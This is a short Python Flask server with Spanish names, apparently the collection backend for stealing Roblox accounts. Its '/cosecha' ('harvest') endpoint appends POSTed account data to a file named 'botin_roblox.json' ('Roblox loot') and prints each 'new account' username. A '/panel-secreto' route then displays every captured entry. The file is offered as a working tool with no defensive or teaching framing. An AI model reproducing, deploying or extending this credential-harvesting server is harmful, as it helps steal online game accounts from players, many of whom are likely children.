from flask import Flask, request, jsonify, render_template_string
import json
import os

app = Flask(__name__)
LOG_FILE = "botin_roblox.json"

@app.route('/')
def home():
    return "System Online - Project Blox"

@app.route('/cosecha', methods=['POST'])
def cosecha():
    data = request.json
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
    print(f"🚩 NUEVA CUENTA: {data['usuario']}")
    return jsonify({"status": "success"}), 200

@app.route('/panel-secreto')
def ver_botin():
    if not os.path.exists(LOG_FILE): return "Vaciamente..."
    with open(LOG_FILE, "r") as f:
        cuentas = f.readlines()
    return "<br>".join(cuentas)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
